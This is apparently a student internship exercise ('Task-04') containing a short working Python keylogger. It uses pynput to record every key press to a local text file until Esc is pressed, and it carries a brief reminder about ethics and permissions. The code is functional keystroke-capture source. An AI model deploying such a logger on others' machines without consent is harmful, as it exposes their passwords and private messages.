##Prodigy Infotech Task-04

#Task-04 : Simple Keylogger

#Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.

#Code:

import pynput
from pynput.keyboard import Key, Listener

# File to save keystrokes
log_file = "key_log.txt"

# Function to write keystrokes to the file
def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

#END...
